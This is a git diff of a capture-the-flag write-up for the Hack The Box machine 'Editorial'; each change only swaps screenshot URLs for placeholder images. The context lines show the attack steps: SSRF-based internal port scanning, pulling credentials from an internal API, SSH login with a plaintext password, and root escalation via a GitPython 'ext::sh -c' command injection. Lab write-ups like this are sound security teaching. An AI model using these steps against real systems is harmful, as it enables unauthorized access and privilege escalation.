@@ -13,7 +13,7 @@ export target=10.129.9.82
 echo "10.129.9.82 editorial.htb" | sudo tee -a /etc/hosts
 ```
 
-<img width="340" height="58" alt="image" src="https://github.com/user-attachments/assets/9b20fac9-7b6d-4eb2-8c1d-2a405369b02e" />
+<img width="340" height="58" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
 ### Network Scanning
 
@@ -22,7 +22,7 @@ echo "10.129.9.82 editorial.htb" | sudo tee -a /etc/hosts
 sudo nmap -p- --min-rate 5000 -sT -vvv $target
 ```
 
-<img width="705" height="216" alt="image" src="https://github.com/user-attachments/assets/2e7d393b-a866-4bbd-a863-e80affd3ad2d" />
+<img width="705" height="216" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Results:**
 ```
@@ -36,7 +36,7 @@ PORT   STATE SERVICE REASON
 sudo nmap -sC -sV -p 22,80 -T4 $target
 ```
 
-<img width="775" height="369" alt="image" src="https://github.com/user-attachments/assets/0fa28111-96e8-4b2c-8646-04c07629b495" />
+<img width="775" height="369" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 ---
 
@@ -46,7 +46,7 @@ sudo nmap -sC -sV -p 22,80 -T4 $target
 
 The web application hosted on port 80 revealed an upload functionality at `http://editorial.htb/upload` that was found to generate outbound HTTP requests.
 
-<img width="775" height="369" alt="image" src="https://github.com/user-attachments/assets/62054cd9-45cd-44d0-b8e2-b53f1f6fd7d8" />
+<img width="775" height="369" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 ### SSRF Vulnerability Discovery
 
@@ -76,7 +76,7 @@ Content-Type: application/octet-stream
 -----------------------------18468863312856139189471193778--
 ```
 
-<img width="577" height="552" alt="image" src="https://github.com/user-attachments/assets/d1e1aa92-c92e-4189-9f68-0ecf3e65015d" />
+<img width="577" height="552" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 **Server Response:**
 ```http
@@ -90,7 +90,7 @@ Content-Length: 61
 /static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
 ```
 
-<img width="575" height="270" alt="image" src="https://github.com/user-attachments/assets/8d06c762-6997-49e9-a6e5-f991b7edb56c" />
+<img width="575" height="270" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 ### SSRF Confirmation and Port Discovery
 
@@ -126,9 +126,9 @@ EOF
 ffuf -request request.req -request-proto http -w <(seq 1 65535) -ac
 ```
 
-<img width="753" height="339" alt="image" src="https://github.com/user-attachments/assets/b8943335-f8dd-44f8-bae1-4439fb2dda11" />
+<img width="753" height="339" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
-<img width="1233" height="537" alt="image" src="https://github.com/user-attachments/assets/225630b6-774e-4280-afb7-728626077df7" />
+<img width="1233" height="537" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 **Discovery:** Internal service running on **port 5000**
 
@@ -154,7 +154,7 @@ The server returned a UUID file path: `/static/uploads/79ca0f80-ccaf-48f9-8d1c-6
 curl -s http://editorial.htb/static/uploads/79ca0f80-ccaf-48f9-8d1c-61c0601b5204 | jq .
 ```
 
-<img width="718" height="908" alt="image" src="https://github.com/user-attachments/assets/40c1b8af-628c-4fef-8fc1-f9a94fae437d" />
+<img width="718" height="908" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **API Structure Discovered:**
 ```json
@@ -221,7 +221,7 @@ curl -X POST http://editorial.htb/upload-cover \
   -F "bookfile=@/dev/null"
 ```
 
-<img width="926" height="725" alt="image" src="https://github.com/user-attachments/assets/04e74b66-a933-4f46-bfb8-0aec5ac7ca0a" />
+<img width="926" height="725" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 
 **Retrieved Credential File:**
@@ -229,7 +229,7 @@ curl -X POST http://editorial.htb/upload-cover \
 curl -s http://editorial.htb/static/uploads/9617b4f8-15bb-410e-929c-bd9131c0560a | jq .
 ```
 
-<img width="952" height="204" alt="image" src="https://github.com/user-attachments/assets/d34b0fb1-002e-47d0-b6e2-9ae957d13144" />
+<img width="952" height="204" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 **Credentials Exposed:**
 ```json
@@ -249,14 +249,14 @@ curl -s http://editorial.htb/static/uploads/9617b4f8-15bb-410e-929c-bd9131c0560a
 crackmapexec ssh 10.129.9.82 -u dev -p 'dev080217_devAPI!@'
 ```
 
-<img width="775" height="86" alt="image" src="https://github.com/user-attachments/assets/6cbc75f0-47c9-48b5-9f38-df4052c24464" />
+<img width="775" height="86" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 **Successful SSH Access:**
 ```bash
 ssh dev@10.129.9.82
 ```
 
-<img width="703" height="443" alt="image" src="https://github.com/user-attachments/assets/ded991cc-36ae-4a3c-a4bf-d65db7243979" />
+<img width="703" height="443" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 **User Flag Acquisition:**
 ```bash
@@ -283,7 +283,7 @@ b73481b (HEAD) change(api): downgrading prod to dev
 dev@editorial:~/apps$ git diff b73481b 1e84a03
 ```
 
-<img width="952" height="470" alt="image" src="https://github.com/user-attachments/assets/e880ffd3-edc2-41d4-87bb-eb461b40f379" />
+<img width="952" height="470" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 **Production Credentials Discovered:**
 ```diff
@@ -320,7 +320,7 @@ User prod may run the following commands on editorial:
     (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
 ```
 
-<img width="949" height="447" alt="image" src="https://github.com/user-attachments/assets/1a7fa806-2910-45af-86c8-6e18406889a0" />
+<img width="949" height="447" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 ### Vulnerable Script Analysis
 
@@ -347,7 +347,7 @@ gitdb==4.0.10
 GitPython==3.1.29
 ```
 
-<img width="372" height="79" alt="image" src="https://github.com/user-attachments/assets/c8726331-4266-4e59-a7e2-c6965d39c29c" />
+<img width="372" height="79" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
 ### GitPython Vulnerability Exploitation
 
@@ -399,7 +399,7 @@ prod@editorial:~$ chmod +x /dev/shm/script.sh
 prod@editorial:~$ sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /dev/shm/script.sh'
 ```
 
-<img width="964" height="744" alt="image" src="https://github.com/user-attachments/assets/1589d00f-7528-48d8-9240-26c123a02cc8" />
+<img width="964" height="744" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 
 ---
